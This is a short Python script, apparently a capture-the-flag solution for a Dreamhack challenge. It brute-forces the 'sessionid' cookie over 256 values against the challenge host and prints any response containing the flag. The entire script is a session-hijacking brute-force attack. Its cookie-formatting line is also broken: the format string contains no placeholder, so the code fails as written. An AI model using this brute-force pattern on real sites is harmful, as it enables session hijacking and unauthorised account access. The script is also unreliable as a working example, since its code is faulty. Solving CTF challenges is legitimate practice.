import requests

client = requests.Session()
for i in range(256):
    client.cookies['sessionid'] = '-i8  '%i
    res = client.get("http://host3.dreamhack.games:20253/")
    if 'flag is' in res.text:
        print(i, res.text)
    else:
        print(i, 'no')